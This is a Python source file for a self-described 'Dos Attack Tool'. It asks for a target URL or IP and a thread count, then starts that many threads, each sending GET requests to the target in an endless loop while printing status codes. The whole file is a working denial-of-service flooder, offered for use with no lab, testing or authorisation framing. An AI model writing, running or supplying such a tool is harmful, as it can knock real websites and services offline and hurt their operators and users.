import threading
import requests
import sys
import time
import os


VERT = "\033[32m"
RESET = "\033[0m"


original_print = print


def print(*args, **kwargs):
    original_print(VERT, end="")
    original_print(*args, **kwargs)
    original_print(RESET, end="\n")

   
logo_ascii = """
                                                 @@@@@@@@@@@@@@@@@@@                                 
                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                             @@@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@@             
                           @@@@@@@@@@@@@@                                   @@@@@@@@@@@@@@@          
                        @@@@@@@@@@@@@              @@@@@@@@@@@@@@@              @@@@@@@@@@@@@        
                       @@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@       
                       @@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@       
                        @@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@        
                                  @@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@                  
                                @@@@@@@@@@@@@                           @@@@@@@@@@@@@                
                               @@@@@@@@@@            @@@@@@@@@@@            @@@@@@@@@@               
                                @@@@@@@         @@@@@@@@@@@@@@@@@@@@@         @@@@@@@                
                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            
                                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                         @@@@@@@@@@@             @@@@@@@@@@@                         
                                        @@@@@@@@@                   @@@@@@@@@                        
                                         @@@@@@        @@@@@@@        @@@@@@                         
                                                    @@@@@@@@@@@@@                                    
                                                   @@@@@@@@@@@@@@@                                   
                                                  @@@@@@@@@@@@@@@@@                                  
                                                  @@@@@@@@@@@@@@@@@                                  
                                                   @@@@@@@@@@@@@@@                                   
                                                    @@@@@@@@@@@@@                                    
                                                       @@@@@@@            

"""


os.system('cls' if os.name == 'nt' else 'clear')


print(logo_ascii)


time.sleep(2)


def attack(target):
    """
    Continuously sends GET requests to the specified target (URL or IP).
    """
    
    while True:
        try:
            
            response = requests.get(target, timeout=5) 
            status_code = response.status_code
            thread_id = threading.get_ident()
            
            
            print(f"Thread {thread_id} | Sent request | Status Code: {status_code}")

        except requests.exceptions.Timeout:
            
            print(f"Thread {threading.get_ident()} | Error: Request timed out.")
        
        except requests.exceptions.RequestException as e:
            
            print(f"Thread {threading.get_ident()} | Error: {e}")
        
        except Exception as e:
            
            print(f"Thread {threading.get_ident()} | Unexpected Error: {e}")


def main():
    print("--- Dos Attack Tool ---")
    

    while True:
        target_input = input("Please enter the target URL or IP: ").strip()
        
        if not target_input:
            print("Error: The target cannot be empty. Please try again.")
            continue
            
        
        is_ip = '.' in target_input and not target_input.lower().startswith(('http', 'https'))
        
        
        if target_input.lower().startswith('http'):
            
            target = target_input
        elif is_ip:
            
            target = "http://" + target_input
        else:
            
            print("Warning: Assuming domain name, defaulting to https...")
            target = "https://" + target_input.lstrip("/")
            
        print(f"Target set to: {target}")
        break
    
    
    while True:
        num_threads_input = input("Please enter the number of threads: ").strip()
        try:
            num_threads = int(num_threads_input)
            if num_threads <= 0:
                print("Error: The number of threads must be a positive integer.")
            else:
                print(f"Using {num_threads} threads.")
                break
        except ValueError:
            print("Error: Invalid input. Please enter a whole number.")

    
    
    print("\nStarting the Dos Attack")
    threads = []
    
    try:
        for i in range(num_threads):
            
            thread = threading.Thread(target=attack, args=(target,))
            threads.append(thread)
            
            thread.daemon = True 
            thread.start()
        
        print(f"Successfully started {num_threads} threads. Requests are now being sent.")
        print("Press Ctrl+C to stop the execution.")
        
        
        for thread in threads:
            thread.join() 

    except KeyboardInterrupt:
        
        print("\n\nExecution interrupted by user (Ctrl+C). Shutting down...")
        sys.exit(0)
        
    except Exception as e:
        
        print("\n-------------------------------------------------------------")
        print(f"An unexpected error occurred during thread management: {e}")
        print("The program has been paused for inspection.")
        
        input("Press ENTER to close the program...")
        print("-------------------------------------------------------------")
        sys.exit(1)

if __name__ == "__main__":
    main()